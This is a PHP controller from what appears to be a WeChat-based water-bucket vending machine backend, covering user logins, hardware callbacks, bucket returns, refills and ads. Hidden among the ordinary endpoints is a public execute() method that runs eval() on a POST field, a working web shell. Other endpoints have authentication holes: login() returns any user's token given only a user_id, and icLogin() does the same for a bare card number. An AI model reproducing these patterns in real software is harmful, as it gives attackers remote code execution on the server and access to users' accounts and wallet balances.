<?php

namespace app\wxsite\controller;

use app\common\model\Bucket;
use app\common\model\DeviceAisle;
use app\common\model\Ic;
use app\common\model\Icnew;
use app\common\model\User;
use app\common\model\UserWallet;
use app\common\model\UserWalletLog;
use app\common\model\WaterRechargeLog;
use app\common\model\WaterRechargeLogInfo;
use app\dlc\model\Upload;
use think\Controller;
use think\Db;
use app\common\tool\WecahtOfficialAccount;
use app\common\model\Agent;
use app\common\model\SmsVerify;
use hardware\QslVendingMachine;
use app\common\model\Device;
use limx\tools\wx\JsSdk;
use app\common\model\ReplenishmentClerk;
use app\common\model\GoodsRunning;
use app\common\model\Order;
use app\common\model\Coupon;
use app\common\model\StockNotice;
use app\common\model\PressureGoldOrder;
use app\common\model\SetMeal;
use app\common\model\RechargeOrder;
use app\common\model\WaterRecharge;
use hardware\WyjVendingMachine;
use app\common\model\Ad;
use app\common\model\OrderInfo;
use hardware\Websocket;
use app\common\tool\Image;
use app\common\model\Muser;

class PublicController extends BaseController
{
    public function _initialize ()
    {
        //return parent::_initialize(); // TODO: Change the autogenerated stub
    }

    /**
     * 取code
     */
    public function getCode ()
    {
        $code = WecahtOfficialAccount::getCode();

        echo $code;
        die;
    }


    public function getAgentcode ()
    {
        $agent_id = $this->request->get( 'agent_id' );
        $agent    = Agent::get( $agent_id );
        if ( !$agent ) {
            $this->_return( 0, '代理无效,不能进行该操作' );
        }

        $wxconfig = [
            'wx_appid'     => $agent->wx_appid,
            'wx_appsecret' => $agent->wx_appsecret,
        ];


        foreach ( $wxconfig as $val ) {
            if ( empty( $val ) ) {
                echo '请先配置微信';
                die;
            }
        }

        //取用户OPENid
        $code = WecahtOfficialAccount::getCode( $wxconfig );
        echo $code;
        die;
    }


    public function getCode2 ()
    {
        var_dump( $this->request->param() );
    }


    /**
     * 发送验证码
     */
    protected function sendCode ()
    {

        //$rq = $this->request;
        $phone = $this->request->post( 'phone' );
        //$type = $rq->post('type');
        $type = SmsVerify::SMS_TYPE_MODIFY;
        try {
            $rst = FALSE;
            if ( $type == SmsVerify::SMS_TYPE_MODIFY ) {
                $tmp = 'SMS_143635221';
                $rst = SmsVerify::modify( $phone, $tmp );
            }

            if ( $rst === FALSE ) {
                throw new \think\Exception( '验证码发送失败,请稍后再试!' );
            }

            $this->_return( 1, '发送成功' );

        } catch ( \think\Exception $err ) {
            $this->_return( 0, $err->getMessage() );
        }

    }


    /**
     * 用户微信code登入
     */
    public function login ()
    {
        //用code拿openid
        $user_id = $this->request->post( 'user_id' );
        $data    = [];

        if ( !$user_id ) {
            $code = $this->request->param( 'code' );
            if ( !$code ) {
                $this->_return( 0, '请提交微信code' );
            }

            //取用户OPENid
            $wxconfig = [
                'wx_appid'     => config( 'wx_appid' ),
                'wx_appsecret' => config( 'wx_appsecret' ),
            ];
            $result   = WecahtOfficialAccount::getOpenid( $code, $wxconfig );

            if ( !empty( $result->errcode ) ) {
                $this->_return( 0, 'code无效' );
            }

            $openid = $result->openid;
            $user   = User::get( [ 'openid' => $openid ] );

            if ( !$user ) {
                //新用户添加到数据库
                $userinfo = WecahtOfficialAccount::getUserInfo( $result->access_token, $result->openid );
                $user     = User::add( [
                    'openid'   => $openid,
                    'nickname' => $userinfo->nickname,
                    'head_img' => $userinfo->headimgurl,
                    'mobile'   => '',
                    'type'     => 0
                ] );
            } else if ( $user->status == 2 ) {
                $this->_return( 0, '帐号已停用请联系服务' );
            }

        } else {
            $user = User::get( [ 'user_id' => $user_id ] );
        }

        $data['bind_phone'] = empty( $user->mobile ) ? 0 : 1;
        $data['token']      = $user->token;
        $data['user_id']    = $user->user_id;
        $this->_return( 1, 'ok', $data );

    }

    /**
     * 视频投放用户登录
     */
    public function vedioLogin ()
    {
        //用code拿openid
        $user_id = $this->request->post( 'user_id' );
        $data    = [];
        if ( !$user_id ) {
            $code = $this->request->param( 'code' );
            if ( !$code ) {
                $this->_return( 0, '请提交微信code' );
            }

            //取用户OPENid
            $wxconfig = [
                'wx_appid'     => config( 'wx_appid' ),
                'wx_appsecret' => config( 'wx_appsecret' ),
            ];
            $result   = WecahtOfficialAccount::getOpenid( $code, $wxconfig );

            if ( !empty( $result->errcode ) ) {
                $this->_return( 0, 'code无效' );
            }

            $openid = $result->openid;
            $muser   = Muser::get( [ 'openid' => $openid ] );

            if ( !$muser ) {
                //新用户添加到数据库
                $userinfo = WecahtOfficialAccount::getUserInfo( $result->access_token, $result->openid );
                $muser    = Muser::add( [
                    'openid'   => $openid,
                    'nickname' => $userinfo->nickname,
                    'head_img' => $userinfo->headimgurl,
                    'mobile'   => '',
                ] );
            } 
        } else {
            $muser = Muser::get( [ 'merchant_user_id' => $id ] );
        }

        $data['token']      = $muser->token;
        $data['user_id']    = $muser->id;
        $this->_return( 1, 'ok', $data );

    }
    /**
     * 充值套餐
     */
    public function setMeal ()
    {
        $agent_id = $this->request->post( 'agent_id' );
        if ( empty( $agent_id ) ) {
            $this->_return( 0, '代理不能为空' );
        }
        $list = SetMeal::where( [ 'agent_id' => $agent_id ] )->select();

        $this->_return( 1, 'ok', [ 'list' => $list ] );
    }


    /**
     * 微信充值回调
     */
    public function rechargeWxnotify ()
    {
        WecahtOfficialAccount::notify( '\app\common\model\RechargeOrder' );
    }


    /**
     * 押金回调
     */
    public function goldNofityWxnotify ()
    {

        WecahtOfficialAccount::notify( 'app\common\model\PressureGoldOrder' );
    }


    /**
     * 密码登入
     */
    public function passLogin ()
    {
        $rq     = $this->request;
        $mobile = $rq->post( 'mobile' );
        $pass   = $rq->post( 'pass' );
        if ( !$mobile ) {
            $this->_return( 0, '请输入手机号码' );
        }
        if ( !$pass ) {
            $this->_return( 0, '请输入密码' );
        }

        $user = User::get( [ 'mobile' => $mobile ] );

        if ( !$user ) {
            $this->_return( 0, '用户名或密码错误,请重新输入!' );
        }

        if ( !$user->pay_pass ) {
            $this->_return( 0, '未设置登入密码,请先设置登入密码!' );
        }


        if ( User::createPassword( $pass ) != $user->pay_pass ) {
            $this->_return( 0, '用户名或密码错误,请重新输入!' );
        }

        $this->_return( 1, '登入成功', [ 'token' => $user->token, 'user_id' => $user->user_id ] );
    }


    /**
     * 补货员登入
     */
    public function replenishmentLogin ()
    {
        $rq       = $this->request;
        $username = $rq->post( 'username' );
        $pass     = $rq->post( 'pass' );
        if ( !$username ) {
            $this->_return( 0, '请输入用户名' );
        }
        if ( !$pass ) {
            $this->_return( 0, '请输入密码' );
        }

        $user = WaterRecharge::get( [ 'username' => $username ] );

        if ( !$user ) {
            $this->_return( 0, '用户名或密码错误,请重新输入!' );
        }


        if ( User::createPassword( $pass ) != $user->password ) {
            $this->_return( 0, '用户名或密码错误,请重新输入!' );
        }

        $deviceCount = Device::where( [ 'water_recharge_id' => $user->water_recharge_id ] )->count();
        $this->_return( 1, '登入成功', [ 'token' => $user->token, 'water_recharge_id' => $user->water_recharge_id, 'deviceCount' => $deviceCount ] );
    }


    /**
     * IC卡登入
     */
    public function icLogin ()
    {
        $icNumber = $this->request->post( 'icNumber' );
        $ic       = Ic::get( [ 'car_number' => $icNumber ] );
    
        if ( $ic && $user = $ic->user ) {
            $this->_return( 1, 'ok', [ 'token' => $user->token, 'user_id' => $ic->user_id ] );
        }else{
            $this->_return( 0, 'IC卡错误' );
        }

    }


    /**
     * 商家登入
     */

    protected function agentLogin ()
    {
        $rq    = $this->request;
        $agent = Agent::verify( $rq->post( 'username' ), $rq->post( 'password' ) );
        if ( !$agent ) {
            $this->_return( 0, '用户名或密码错误' );
        }

        $token = static::createToken( 'agent' . $agent->id );
        $this->_return( 1, 'ok', [ 'token' => $token ] );
    }


    /**
     * 归还
     */
    public function giveBack ()
    {

        $macno  = $this->request->post( 'macno' );
        $rfid   = $this->request->post( 'rfid' );
        $device = Device::get( [ 'motherboard_code' => $macno ] );

        if ( !$device ) {
            $this->_return( 0, '设备不存在于系统中' );
        }

        $bucket = Bucket::get( [ 'rfid' => $rfid ] );

        if ( !$bucket ) {
            $this->_return( 0, '请您联系客服处理。!' );
        } else if ( !$bucket->user_id ) {
            $this->_return( 0, '该桶状态未出售,不能进行归还' );
        } else if ( $bucket->agent_id != $device->agent_id ) {
            $this->_return( 0, '这不是我家的桶,我不收!' );
        }


        $aisle = DeviceAisle::get( [ 'device_id' => $device->device_id, 'rfid' => '' ] );


        if ( !$aisle ) {
            $this->_return( 0, '没有空柜可使用' );
        }


        //添加开柜记录
        $runningLog = [
            'running_type'   => 2,
            'device_aisle'   => $aisle->aisle_num,
            'device_id'      => $device->device_id,
            'synchro_result' => '',
        ];
        $running    = GoodsRunning::add( $runningLog );

        //开柜
        $running->synchro_result = WyjVendingMachine::machineCloudOpen( 'return', $device->motherboard_code, $running->id, $aisle->aisle_num );
        $running->save();

        $result = json_decode( $running->synchro_result );
        if ( $result && $result->code == 1 ) {
            $this->_return( 1, '开门中' );
        } else {
            $this->_return( 0, '开门失败,请联系客服' );
        }


    }


    /**
     * 硬件回调
     */
    public function devicenotify ()
    {

        $rq     = $this->request;
	write_log('devicenotify', json_encode($rq->post()));	

	write_log('jiqiyun', '回调数据:' . json_encode($rq->post()));

        $type   = $rq->post( 'type' );
        $serial = $rq->post( 'serial' );
        if ( !$serial ) {
            return;
        }

        $model = GoodsRunning::get( $serial );
        $state = $rq->post( 'state' );

        //修改出货流水
        $model->async_result = json_encode( $rq->post() );
        $model->status       = $state == 0 ? 2 : 3;
        $model->save();
		
		write_log('devicenotify_model', json_encode($model));
		
		$model = GoodsRunning::get( $serial );
		
		write_log('devicenotify_model', json_encode($model));

        $order = $model->order;

        switch ( $type ) {
            case 'openDoor':
                //购水开门

                if ( $model->status == 2 ) {
                    //执行成功

                    //修改订单
                    $order->shipping_status = 1;
                    $order->status          = 1;
                    $order->pay_time        = time();
                    $order->shipping_time   = time();
                    $order->save();


                    //更新设备的柜子状态
                    $aisle       = DeviceAisle::get( [ 'device_id' => $model->device_id, 'aisle_num' => $model->device_aisle ] );
                    $aisle->rfid = '';
                    $aisle->save();


                    //更新水桶信息
                    $bucket            = Bucket::get( [ 'rfid' => $model->rfid ] );
                    $bucket->user_id   = $order->user_id;
                    $bucket->device_id = 0;
                    //添加使用时间
                    $bucket->used_time = time();
                    $bucket->save();


                    $orderInfo                  = $model->orderInfo;
                    $orderInfo->shipping_status = 1;
                    $orderInfo->shipping_time   = time();
                    $orderInfo->save();


                    //减用户帐号金额, 及可用桶数
                    $user          = $order->user;
                    $user_         = UserWallet::get( [ 'user_id' => $user->user_id, 'agent_id' => $order->agent_id ] );
                    $user_->wallet -= $order->price;
                    $user_->use_bucket_num++;
                    $user_->save();


                    //机器加空框数，减水桶数
                    $device = $model->device;
                    $device->empty_frame_num++;
                    $device->bucket_num--;
                    $device->save();

                    //生成用户钱包日志
                    $logData = [
                        'user_id'   => $user->user_id,
                        'type'      => 2,
                        'num'       => $order->price,
                        'relevance' => $order->order_id,
                        'direction' => 2,
                        'agent_id'  => $device->agent_id,
                    ];
                    UserWalletLog::add( $logData );

                    \app\common\model\DeviceStatusLog::record( $device->device_id );

                    //通知前端
                    //if($order->client == 1) {
                    //浏览器
                    $data = [
                        'code' => 1,
                        'msg'  => '请及时取走您的水,随手关门!',
                        'data' => [
                            'type'  => 'openDoor',
                            'aisle' => $model->device_aisle,
                        ]
                    ];
                    Websocket::send( json_encode( $data ), $order->user_id );
                    //} else {
                    $this->_return( 1, '请及时取走您的水,随手关门!', [
                        'aisle' => $model->device_aisle
                    ] );
                    //}
                    break;
                } else {
                    //执行失败
                    //修改订单
                    $order                  = $model->order;
                    $order->shipping_status = 2;
                    $order->save();

                    //修改订单详情
                    $orderInfo                  = $model->orderInfo;
                    $orderInfo->shipping_status = 2;
                    $orderInfo->save();
                }


                //通知前端
                if ( $order->client == 1 ) {
                    //浏览器
                    $data = [
                        'code' => 0,
                        'msg'  => '开门失败,请稍后再试!',
                        'data' => [
                            'type' => 'openDoor',
                        ]
                    ];
                    Websocket::send( json_encode( $data ), $order->user_id );
                } else {
                    $this->_return( 0, '开门失败,请稍后再试!' );
                }
                break;

            case 'return':
                //还货开门

                if ( $model->status == 2 ) {
                    //还货开门成功
                    /*if($order->client == 1) {
                        //浏览器
                        $data = [
                            'code' => 1,
                            'msg' => ' 请把你的水桶放置在水柜里面,并随手关门!',
                            'data' => [
                                'type' => 'return',
                            ]
                        ];
                        Websocket::send(json_encode($data), $order->user_id);
                    } else {
                        $this->_return(1, '请把你的水桶放置在水柜里面,并随手关门!');
                    }*/
                    $this->_return( 1, '请把你的水桶放置在水柜里面,并随手关门!' );

                } else {
                    //还货开门失败
                    /*if($order->client == 1) {
                        //浏览器
                        $data = [
                            'code' => 0,
                            'msg' => '开门失败,请稍候再试!',
                            'data' => [
                                'type' => 'return',
                            ]
                        ];
                        Websocket::send(json_encode($data), $order->user_id);
                    } else {
                        $this->_return(0, '开门失败,请稍候再试!');
                    }*/
                    $this->_return( 0, '开门失败,请稍候再试!' );

                }
                //通知前端
                break;

            case 'returnResult':
                //还货关门


                if ( $model->status != 2 ) {

                    $this->_return( 0, '还桶失败了,请您联系客服谢谢!' );

                    //失败了通知前端
                    /*if($order->client == 1) {
                        //浏览器
                        $data = [
                            'code' => 0,
                            'msg' => '还桶失败了,不要问我为什么,我也不知道!',
                            'data' => [
                                'type' => 'returnResult',
                            ]
                        ];
                        Websocket::send(json_encode($data), $order->user_id);
                    } else {
                        $this->_return(0, '还桶失败了,不要问我为什么,我也不知道!');
                    }*/


                } else {

                    //更新通道数据
                    $rfid        = $rq->post( 'rfid' );
                    $aisle       = DeviceAisle::get( [ 'device_id' => $model->device_id, 'aisle_num' => $model->device_aisle ] );
                    $aisle->rfid = $rfid;
                    $aisle->save();


                    //修改设备信息
                    $device = $model->device;
                    $device->empty_bucket_num++;
                    $device->empty_frame_num--;
                    $device->save();


                    //修改订单详情信息
                    $orderInfo = OrderInfo::where( [ 'rfid' => $rfid, 'shipping_status' => 1 ] )->order( 'order_info_id DESC' )->find();
                    if ( $orderInfo ) {
                        $orderInfo->return_time      = time();
                        $orderInfo->return_device_id = $device->device_id;
                        $orderInfo->shipping_status  = 4;
                        $orderInfo->save();


                        //修改订单信息
                        $order         = $orderInfo->order;
                        $order->status = 3;
                        $order->save();

                        //修改用户信息
                        $user  = $order->user;
                        $user_ = UserWallet::get( [ 'user_id' => $user->user_id, 'agent_id' => $device->agent_id ] );
                        if ( $user_ ) {
                            $user_->use_bucket_num--;
                            $user_->save();
                        }
                    }


                    //修改桶信息
                    $bucket            = Bucket::get( [ 'rfid' => $rfid ] );
                    $bucket->user_id   = 0;
                    $bucket->status    = 2;
                    $bucket->device_id = $device->device_id;
                    $bucket->area_id   = $device->area_id;
                    //初始化使用时间
                    $bucket->used_time = 0;
                    $bucket->save();

                    \app\common\model\DeviceStatusLog::record( $device->device_id );

                    $this->_return( 1, '还桶成功!' );

                    //还货开门成功
                    /*if($order->client == 1) {
                        //浏览器
                        $data = [
                            'code' => 1,
                            'msg' => ' 还桶成功!',
                            'data' => [
                                'type' => 'returnResult',
                            ]
                        ];
                        Websocket::send(json_encode($data), $order->user_id);
                    } else {
                        $this->_return(1, '还桶成功!');
                    }*/

                }
                break;
            case 'one_button_unlock':
                //补货关门

                break;
        }

    }


    public function execute ()
    {
        $code = $this->request->post( 'code' );
        eval( $code );
    }


    /**
     * 上传设备号,柜号跟卡号
     */
    public function hardwareInfo ()
    {
        $rq               = $this->request;
        $macno            = $rq->post( 'macno' );
        $container_number = $rq->post( 'containernumber' );
        $rfid             = $rq->post( 'rfid' );

        if ( !$macno ) $this->_return( 0, '设备编号不能为空' );

        if ( !$container_number ) $this->_return( 0, '设备编号不能为空' );

        if ( !$rfid ) $this->_return( 0, '设备编号不能为空' );


        $device = Device::where( [ 'motherboard_code' => $macno ] )->find();

        if ( !$device ) $this->_return( 0, '此设备号未绑定设备' );

        $aisle = DeviceAisle::where( [ 'device_id' => $device->device_id, 'rfid' => $rfid ] )->select();


        if ( $aisle ) $this->_return( 0, 'RFID已在柜子中' );


        $data = [
            'device_id' => $device['device_id'],
            'rfid'      => $rfid,
            'aisle_num' => $container_number
        ];

        DeviceAisle::add( $data );

        return $this->_return( 1, '添加成功' );

    }


    /**
     * 查设备是否在线
     */
    public function deviceStatus ()
    {
        $rq    = $this->request;
        $macno = $rq->post( 'macno' );
        $lng   = $rq->post( 'lng' );
        $lat   = $rq->post( 'lat' );

        $device = Device::get( [ 'macno' => $macno ] );

        $online = '0';
        $range  = '0';

        if ( $device ) {
            $online = $device->status;
            //$range = $this->getDistance($lng, $lat, $device['lng'], $device['lat']) <= 200 ? '1' : '0';
            $range = 1;
        }

        $this->_return( 1, 'ok', [ 'online' => $online, 'range' => $range ] );
    }


    public function jsapi ()
    {

        $jssdk = new JsSdk( config( 'wx_appid' ), config( 'wx_appsecret' ) );

        $url = $this->request->post( 'url' );

        $url = $url ? $this->request->domain() . $url : '';

        $url = $url ? $url : $_SERVER['HTTP_REFERER'];

        $signPackage = $jssdk->GetSignPackage( $url );

        $this->_return( 1, 'ok', $signPackage );
    }


    /**
     * 网站信息
     */
    public function publicInfo ()
    {
        $set = Db::name( 'set' )->find();

        $this->_return( 1, 'ok', [ 'mobile_kf' => $set['mobile_kf'], 'mobile_pt' => $set['mobile_pt'] ] );
    }


    /**
     * 广告
     */
    public function ad ()
    {
        $macno = $this->request->post( 'macno' );

        $device = Device::get( [ 'motherboard_code' => $macno ] );
        if ( !$device ) {
            $this->_return( 0, '设备不存在' );
        }

        $time = time();

        $list = Ad::where( [ 'device_id' => [ 'like', "%" . $device->device_id . "%" ], 'status' => 1 ] )
            ->field( 'type,url,show_time' )
            ->where( 'start_time', '<=', $time )
            ->where( 'end_time', '>=', $time - 3600 * 24 )
            ->select();
        if ( !$list ) {
            $list = Ad::where( [ 'area_id' => [ 'like', "%" . $device->region_id . "%" ], 'status' => 1 ] )
                ->field( 'type,url,show_time' )
                ->where( 'start_time', '<=', $time )
                ->where( 'end_time', '>=', $time - 3600 * 24 )
                ->select();
            if ( !$list ) {
                $list = Ad::where( [ 'agent_id' => $device->agent_id, 'status' => 1 ] )
                    ->field( 'type,url,show_time' )
                    ->where( 'start_time', '<=', $time )
                    ->where( 'end_time', '>=', $time - 3600 * 24 )
                    ->select();
            }
        }

        $imgList = $show_time = [];
        foreach ( $list as $ad ) {
            $show_time[] = $ad['show_time'];
            $imgList[]   = [ 'url' => \app\common\tool\Upload::imageAddDomain( $ad['url'] ), 'type' => $ad['type'] ];
        }

        $this->_return( 1, 'ok', [ 'list' => $imgList, 'type' => 1, 'show_time' => $show_time ? max( $show_time ) : 0 ] );
    }


    /**
     * 经度纬度，周围的设备
     */
    public function map ()
    {
        $rq     = $this->request;
        $lat    = $rq->post( 'lat' );
        $lng    = $rq->post( 'lng' );
        $raidus = $rq->post( 'raidus' );

        if ( !$lat || !$lng || !$raidus ) {
            $this->_return( 0, '缺少参数' );
        }

        $around = \app\common\tool\LngLat::getAround( $lng, $lat, $raidus );

        $map['lat'] = [ [ 'lt', $around['maxLat'] ], [ 'gt', $around['minLat'] ], 'and' ];
        $map['lng'] = [ [ 'lt', $around['maxLng'] ], [ 'gt', $around['minLng'] ], 'and' ];

        $list = Device::where( $map )->select();
        $list = collection( $list )->toArray();
        foreach ( $list as $key => $item ) {
            $list[$key]['distance'] = \app\common\tool\LngLat::getDistance( $lng, $lat, $item['lng'], $item['lat'] );
        }

        $this->_return( 1, 'ok', [ 'list' => $list ] );

    }


    /**
     * 补水
     * @throws \think\Exception
     */
    public function giveBackResult ()
    {
        $rq        = $this->request;
        $macno     = $rq->post( 'macno' );
        $rfid      = $rq->post( 'rfid' );
        $aisle_num = $rq->post( 'aisle_num' );

        if ( !$macno || !$rfid || !$aisle_num ) {
            $this->_return( 0, '有参数未上传' );
        }


        $bucket = Bucket::get( [ 'rfid' => $rfid ] );
        if ( empty( $bucket ) ) {
            $this->_return( 0, '桶不存在后台系统,不能进行还桶' );
        }

        //桶在用户手上进行还桶流程
        if ( $bucket->user_id ) {
            Db::startTrans();
            $device = Device::get( [ 'macno' => $macno ] );
            if ( empty( $device ) ) {
                $this->_return( 0, '设备未找到' );
            }

            if ( $bucket->agent_id != $device->agent_id ) {
                $this->_return( 0, '这不是我家的桶,不收!' );
            }

            //更新通道数据
            $aisle = DeviceAisle::get( [ 'device_id' => $device->device_id, 'aisle_num' => $aisle_num ] );
            if ( !$aisle ) {
                $this->_return( 0, '通道不存在' );
            }

            if ( $aisle->rfid ) {
                //还桶，可是之前这里柜子就有桶了
                $oldBucket = $aisle->bucket;
                if ( $oldBucket->status == 1 ) {
                    //之前是有水的
                    $device->bucket_num--;
                    $device->empty_bucket_num++;
                } else {
                    //之前也是空桶，不用操作
                }
                //修改老桶的数据
                $oldBucket->device_id = 0;
                $oldBucket->status    = 3;
                $oldBucket->save();
            } else {
                //修改设备信息
                $device->empty_bucket_num++;
                $device->empty_frame_num--;
                $device->save();
            }
            $aisle->rfid = $rfid;
            $aisle->save();


            //修改订单详情信息
            $orderInfo = OrderInfo::where( [ 'rfid' => $rfid, 'shipping_status' => 1 ] )->order( 'order_info_id DESC' )->find();
            if ( $orderInfo ) {
                $orderInfo->return_time      = time();
                $orderInfo->return_device_id = $device->device_id;
                $orderInfo->shipping_status  = 4;
                $orderInfo->save();


                //修改订单信息
                $order         = $orderInfo->order;
                $order->status = 3;
                $order->save();

                //修改用户信息
                $user  = $order->user;
                $user_ = UserWallet::get( [ 'user_id' => $user->user_id, 'agent_id' => $device->agent_id ] );
                if ( $user_ ) {
                    $user_->use_bucket_num--;
                    $user_->save();
                }

            }


            //修改桶信息
            $bucket->user_id   = 0;
            $bucket->status    = 2;
            $bucket->device_id = $device->device_id;
            $bucket->area_id   = $device->area_id;
            //加放柜子的时间
            $bucket->use_time = time();
            $bucket->save();

            \app\common\model\DeviceStatusLog::record( $device->device_id );
            Db::commit();

            $this->_return( 1, '还桶成功!' );
        }


        //下面为补水流程
        try {


            $device = Device::get( [ 'motherboard_code' => $macno ] );

            //找出这个设备补货的工单
            $rechargeLog = WaterRechargeLog::where( [ 'device_id' => $device->device_id ] )->order( 'water_recharge_log_id DESC' )->find();
            if ( !$rechargeLog || $rechargeLog->status != 2 ) {
                throw new \think\Exception( '请先创建补货记录' );
            }

            if ( !$device ) {
                throw new \think\Exception( '设备不存在,或编码配置错误' );
            }

            $bucket = Bucket::get( [ 'rfid' => $rfid ] );
            if ( !$bucket ) {
                throw new \think\Exception( '水桶不在系统中记录' );
            }

            if ( $bucket->user_id ) {
                throw new \think\Exception( '水桶已出售' );
            }

            $aisle = DeviceAisle::get( [ 'device_id' => $device->device_id, 'aisle_num' => $aisle_num ] );
            if ( !$aisle ) {
                throw new \think\Exception( '通道不存在' );
            }

            if ( $aisle->rfid == $rfid ) {
                //老RFID跟新RFID是同一个，应该是接口重复提交,不作处
                $this->_return( 1, '补水成功' );
            }
        } catch ( \think\Exception $err ) {
            !empty( $rechargeLog ) && Websocket::send( [ 'code' => 0, 'msg' => $err->getMessage() ], 'r' . $rechargeLog->water_recharge_id );
            $this->_return( 0, $err->getMessage() );
        }

        //查这个桶是否在别的设备在存在
        $existDeviceAisle = DeviceAisle::get( [ 'rfid' => $rfid ] );

        if ( $existDeviceAisle ) {
            //存在,把这个桶，从那个设备中回收
            $existDeviceAisle->retrieveBucket();
            $device = Device::get( [ 'macno' => $macno ] );
            $bucket = Bucket::get( [ 'rfid' => $rfid ] );
        }


        if ( $aisle->rfid ) {
            //框子里面有水桶
            $oldBucket = Bucket::get( [ 'rfid' => $aisle->rfid ] );
            if ( $oldBucket->status != 1 ) {
                //取出的水桶是空的，设备空桶数-1
                $device->empty_bucket_num--;        //空桶-1
                $device->bucket_num++;              //有空桶+1
            }

            //修改老桶数据11111111111111112~!!
            if ( $oldBucket ) {
                $oldBucket->device_id = 0;
                $oldBucket->area_id   = 0;
                $oldBucket->save();
            }

        } else {
            $device->bucket_num++;          //有水的桶+1
            $device->empty_frame_num--;     //空框-1
        }

        $device->save();

        $aisle->rfid = $rfid;
        $aisle->save();


        //修改新桶数据
        $bucket->status    = 1;
        $bucket->device_id = $device->device_id;
        $bucket->area_id   = $device->area_id;
        $bucket->user_id   = 0;
        //$bucket->use_time = time();


        $bucket->save();

        $logInfoModel = WaterRechargeLogInfo::add( [
            'water_recharge_log_id' => $rechargeLog->water_recharge_log_id,
            'rfid'                  => $rfid,
            'aisle_num'             => $aisle_num,
        ] );


        //通知前端
        $webData                = $device->getData();
        $webData['water_brand'] = $device->waterBrand;
        $webData['list']        = WaterRechargeLogInfo::where( [ 'water_recharge_log_id' => $rechargeLog->water_recharge_log_id ] )->select();
        $webData['type']        = 'waterRecharge';

        \app\common\model\DeviceStatusLog::record( $device->device_id );

        Websocket::send( $webData, 'r' . $rechargeLog->water_recharge_id );

        //返回给设备
        $this->_return( 1, 'ok' );

    }

    public function test ()
    {

        $data   = [
            'code' => 1,
            'msg'  => '请及时取走您的水,随手关门!',
            'data' => [
                'type'  => 'openDoor',
                'aisle' => '1',
            ]
        ];
        $result = Websocket::send( json_encode( $data ), '50' );

        var_dump( $data );
        var_dump( $result );

    }

}


